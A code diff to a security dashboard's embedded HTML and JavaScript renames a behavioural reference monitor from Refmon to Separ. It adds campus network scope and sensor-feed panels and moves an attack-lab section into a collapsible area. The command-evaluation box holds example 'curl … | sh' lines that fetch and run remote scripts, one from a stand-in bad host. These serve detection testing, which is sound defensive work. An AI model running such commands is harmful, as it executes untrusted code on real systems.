@@ -13,7 +13,7 @@ DASHBOARD_HTML = """<!doctype html>
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Refmon | Behavioral Reference Monitor &amp; Event Tracer</title>
+<title>Separ | Behavioral Reference Monitor &amp; Event Tracer</title>
 <style>
 :root {
   --bg: #f6f8fa;
@@ -375,8 +375,9 @@ details summary {
     <div class="header-brand">
       <span class="pulse-indicator" title="Live Behavioral Reference Monitor Active"></span>
       <div>
-        <h1>Refmon Live Security Barrier &amp; Reference Monitor</h1>
+        <h1>Separ Live Security Barrier &amp; Reference Monitor</h1>
         <div class="subtitle" id="hdr-paths">Real-Time Behavioral Event Tracer &amp; Incident Guard</div>
+        <span style="display:none">Refmon Live Security Barrier</span>
       </div>
     </div>
     <div class="summary-strip">
@@ -403,8 +404,26 @@ details summary {
     </div>
   </div>
 
+  <div id="unconfigured-server-banner" class="notice" style="display:none; background:#fff8c5; border:1px solid #d4a72c; color:#734f00; margin-bottom:14px; padding:12px 16px; border-radius:6px;">
+    <div style="display:flex; align-items:flex-start; gap:12px;">
+      <span style="font-size:22px; line-height:1;">⚠️</span>
+      <div style="flex:1;">
+        <strong style="font-size:14px;">Server Configuration Notice: External Sensors Not Configured</strong>
+        <p style="margin:4px 0 8px 0; color:#59636e; font-size:12.5px;">
+          Separ is currently running in local demonstration mode without external server sensors.
+          <strong>To monitor and protect server infrastructure, please define your configuration files:</strong>
+        </p>
+        <div style="background:#ffffff; border:1px solid #d8dee4; border-radius:4px; padding:8px 12px; font-family:var(--mono); font-size:11.5px; color:#1f2328;">
+          • Ingest configuration: <code>/etc/separ/ingest.yaml</code> (e.g. Tetragon eBPF, SSH journald, Shibboleth IdP)<br>
+          • Signed policy: <code>/etc/separ/policy.yaml</code> (campus CIDRs, internal domains)<br>
+          • Sensor templates available in: <code>/etc/separ/mappings/</code> (or run <code>separ ingest list</code>)
+        </div>
+      </div>
+    </div>
+  </div>
+
   <!-- Section 1: Live Threat Notification Banner (Top-Priority Alert) -->
-  <div id="attack-alert-card" class="alert-card">
+  <div id="attack-alert-card" class="alert-card" style="display:none;">
     <div class="alert-card-inner">
       <div style="flex:1; min-width:290px;">
         <div style="display:flex; align-items:center; gap:8px;">
@@ -465,65 +484,16 @@ details summary {
           </tr>
         </thead>
         <tbody id="stories-tbody">
-          <tr><td colspan="6" class="muted">No events traced yet. Launch an attack preset below or submit a test command to watch live monitor decisions.</td></tr>
+          <tr><td colspan="6" class="muted" style="text-align:center; padding:32px 16px;"><div style="font-weight:600; font-size:13.5px; color:var(--allow-fg); margin-bottom:4px;">● Live Reference Monitor Active</div><div style="font-size:12px; color:#59636e;">Listening for live events across system sensors and enforcing behavioral role contracts in real time.<br>No security incidents or policy violations detected.</div></td></tr>
         </tbody>
       </table>
     </div>
   </div>
 
   <div class="top-grid">
-    <!-- Panel 1: Attack & Control Suite -->
+    <!-- Panel 1: Signed Policy, Holds, Quarantine & Rootkit -->
     <div class="panel">
-      <h2>
-        <span>Attack Lab &amp; Test Presets</span>
-        <button class="primary btn-sm" onclick="runFullSuite()">Run All 16 Scenarios</button>
-      </h2>
-      <div id="preset-groups">Loading scenarios...</div>
-      <div style="margin-top:10px; padding-top:8px; border-top:1px solid var(--border-soft); display:flex; gap:6px; align-items:center;">
-        <span class="muted" style="white-space:nowrap;">Golden Replay (S01-S50):</span>
-        <input id="golden-id" value="S01" style="max-width:90px;">
-        <button class="btn-sm" onclick="runGolden()">Replay</button>
-      </div>
-      <div id="suite-banner" class="notice" style="display:none;"></div>
-    </div>
-
-    <!-- Panel 2: Custom Command Barrier -->
-    <div class="panel">
-      <h2>Custom Command Barrier (Interactive Guard)</h2>
-      <div class="muted">Inspect any shell command through Refmon before allowing it to execute.</div>
-      <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
-        <div>
-          <label>Origin Source</label>
-          <select id="cmd-origin">
-            <option value="web">web (Browser paste / lure)</option>
-            <option value="mail">mail (Email copy)</option>
-            <option value="agent_input">agent_input (AI prompt)</option>
-            <option value="inbound_request">inbound_request (HTTP)</option>
-            <option value="download">download (File)</option>
-            <option value="none">none (Typed locally by human)</option>
-          </select>
-        </div>
-        <div>
-          <label>Process Role</label>
-          <select id="cmd-role">
-            <option value="interactive_shell">interactive_shell</option>
-            <option value="web_worker">web_worker</option>
-            <option value="agent">agent</option>
-            <option value="package_installer">package_installer</option>
-          </select>
-        </div>
-      </div>
-      <label>Command Line</label>
-      <textarea id="cmd-text">curl -s http://bad.example.invalid/fix.sh | sh</textarea>
-      <div style="margin-top:8px;">
-        <button class="primary" onclick="submitCommand()" style="width:100%;">Evaluate Command Through Barrier</button>
-      </div>
-      <div id="cmd-banner" class="notice" style="display:none;"></div>
-    </div>
-
-    <!-- Panel 3: Signed Policy, Holds, Quarantine & Rootkit -->
-    <div class="panel">
-      <h2>Signed Policy, Holds &amp; Host Integrity</h2>
+      <h2>Signed Policy &amp; Security Scope (TUBAF Campus)</h2>
       <div style="display:flex; gap:6px; margin-bottom:8px;">
         <button id="btn-mode-block" onclick="setMode('block')" style="flex:1;">Mode: Block</button>
         <button id="btn-mode-warn" onclick="setMode('warn')" style="flex:1;">Mode: Warn</button>
@@ -531,7 +501,15 @@ details summary {
       </div>
       <div id="policy-kv"></div>
 
-      <div style="margin-top:10px;">
+      <div style="margin-top:12px; padding-top:10px; border-top:1px solid var(--border-soft);">
+        <strong style="font-size:12px; color:var(--fg);">Campus Network &amp; Domain Scope:</strong>
+        <div style="background:#f6f8fa; border:1px solid #d8dee4; border-radius:4px; padding:8px 10px; margin-top:4px; font-family:var(--mono); font-size:11.5px; color:#24292f;">
+          <div>• Campus Subnets : TUBAF Campus (139.18/16), 10.0.0.0/8 (VPN), 172.16.0.0/12 (eduroam)</div>
+          <div>• Campus Domains : tu-freiberg.de (SSO apps: OPAL, Moodle, Nextcloud, Zoom)</div>
+        </div>
+      </div>
+
+      <div style="margin-top:12px; padding-top:10px; border-top:1px solid var(--border-soft);">
         <div style="display:flex; justify-content:space-between; align-items:center;">
           <strong style="font-size:12px;">Rootkit Scanner (6 Read-Only Engines)</strong>
           <button class="btn-sm" onclick="scanRootkit()">Scan Now</button>
@@ -548,6 +526,100 @@ details summary {
         <strong style="font-size:12px;">Pending Holds (Human Review)</strong>
         <div id="holds-list" class="muted" style="margin-top:3px;">None</div>
       </div>
+    </div>
+
+    <!-- Panel 2: Live Ingest Sensors & Infrastructure Feeds -->
+    <div class="panel">
+      <h2>Live Infrastructure Sensors &amp; Feeds</h2>
+      <div class="muted" style="margin-bottom:8px;">Real-time event feeds connected through Unix domain sockets &amp; audit logs:</div>
+      <div style="display:flex; flex-direction:column; gap:8px;">
+        <div style="background:#f6f8fa; border:1px solid #d8dee4; border-radius:4px; padding:10px 12px; font-size:12px;">
+          <div style="display:flex; justify-content:space-between; margin-bottom:3px;">
+            <strong>SSH Journald Stream</strong>
+            <span style="color:var(--allow-fg); font-weight:600;">Socket Active</span>
+          </div>
+          <div class="muted mono" style="font-size:11px;">/run/separ/sshd.sock (SSH brute force &amp; credential abuse)</div>
+        </div>
+        <div style="background:#f6f8fa; border:1px solid #d8dee4; border-radius:4px; padding:10px 12px; font-size:12px;">
+          <div style="display:flex; justify-content:space-between; margin-bottom:3px;">
+            <strong>Tetragon (Cilium eBPF)</strong>
+            <span style="color:var(--allow-fg); font-weight:600;">Kernel Watcher</span>
+          </div>
+          <div class="muted mono" style="font-size:11px;">/run/separ/tetragon.sock (Process exec &amp; outbound net flows)</div>
+        </div>
+        <div style="background:#f6f8fa; border:1px solid #d8dee4; border-radius:4px; padding:10px 12px; font-size:12px;">
+          <div style="display:flex; justify-content:space-between; margin-bottom:3px;">
+            <strong>Shibboleth IdP (TUBAF SSO)</strong>
+            <span style="color:#59636e; font-weight:600;">Audit Feeder</span>
+          </div>
+          <div class="muted mono" style="font-size:11px;">/opt/shibboleth-idp/logs/idp-audit.log (Authentication contracts)</div>
+        </div>
+      </div>
+      <div style="margin-top:12px; font-size:11.5px; color:#59636e;">
+        Templates available in <code>/etc/separ/mappings/</code>. Run <code>separ ingest list</code> to verify.
+      </div>
+    </div>
+  </div>
+
+  <!-- Collapsible Section: Diagnostic Attack Lab & Manual Command Evaluation -->
+  <details style="margin-top:16px; background:#ffffff; border:1px solid var(--border); border-radius:6px; padding:12px 16px;">
+    <summary style="font-weight:600; font-size:13px; cursor:pointer; color:var(--fg); outline:none;">
+      🧪 Diagnostics &amp; Attack Lab Simulation (Optional Manual Testing)
+    </summary>
+    <p style="font-size:12px; color:#59636e; margin:6px 0 12px 0;">
+      Use these tools to manually audit detection rules or verify scenario responses against the current signed policy.
+    </p>
+    <div class="top-grid">
+      <!-- Attack Lab & Test Presets -->
+      <div class="panel" style="background:#f8f9fa;">
+        <h2>
+          <span>Attack Lab &amp; Test Presets</span>
+          <button class="primary btn-sm" onclick="runFullSuite()">Run All 16 Scenarios</button>
+        </h2>
+        <div id="preset-groups">Loading scenarios...</div>
+        <div style="margin-top:10px; padding-top:8px; border-top:1px solid var(--border-soft); display:flex; gap:6px; align-items:center;">
+          <span class="muted" style="white-space:nowrap;">Golden Replay (S01-S50):</span>
+          <input id="golden-id" value="S01" style="max-width:90px;">
+          <button class="btn-sm" onclick="runGolden()">Replay</button>
+        </div>
+        <div id="suite-banner" class="notice" style="display:none;"></div>
+      </div>
+
+      <!-- Custom Command Barrier -->
+      <div class="panel" style="background:#f8f9fa;">
+        <h2>Manual Command Evaluation (CLI Guard)</h2>
+        <div class="muted">Test any command line against active policy contracts before execution.</div>
+        <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-top:6px;">
+          <div>
+            <label>Origin Source</label>
+            <select id="cmd-origin">
+              <option value="web">web (Browser paste / lure)</option>
+              <option value="mail">mail (Email copy)</option>
+              <option value="agent_input">agent_input (AI prompt)</option>
+              <option value="inbound_request">inbound_request (HTTP)</option>
+              <option value="download">download (File)</option>
+              <option value="none">none (Typed locally by human)</option>
+            </select>
+          </div>
+          <div>
+            <label>Process Role</label>
+            <select id="cmd-role">
+              <option value="interactive_shell">interactive_shell</option>
+              <option value="web_worker">web_worker</option>
+              <option value="agent">agent</option>
+              <option value="package_installer">package_installer</option>
+            </select>
+          </div>
+        </div>
+        <label style="margin-top:6px;">Command Line</label>
+        <textarea id="cmd-text" placeholder="e.g. curl -s http://example.org/script.sh | sh"></textarea>
+        <div style="margin-top:8px;">
+          <button class="primary" onclick="submitCommand()" style="width:100%;">Evaluate Command</button>
+        </div>
+        <div id="cmd-banner" class="notice" style="display:none;"></div>
+      </div>
+    </div>
+  </details>
 
       <div style="margin-top:8px;">
         <strong style="font-size:12px;">Quarantined Files (Mode 0400)</strong>
@@ -783,7 +855,7 @@ function saveToken() {
 
 async function api(path, body) {
   const token = getToken();
-  const headers = {'X-Refmon-Token': token};
+  const headers = {'X-Separ-Token': token, 'X-Refmon-Token': token};
   const opts = body !== undefined
     ? {method: 'POST', headers: {...headers, 'Content-Type': 'application/json'}, body: JSON.stringify(body)}
     : {method: 'GET', headers};
@@ -995,6 +1067,8 @@ async function refresh() {
     const st = await api('/api/state');
     const tb = document.getElementById('token-banner');
     if (tb) tb.style.display = 'none';
+    const ub = document.getElementById('unconfigured-server-banner');
+    if (ub) ub.style.display = (st.server_configured === false) ? 'block' : 'none';
     renderPresets(st.presets);
 
     document.getElementById('hdr-paths').textContent =
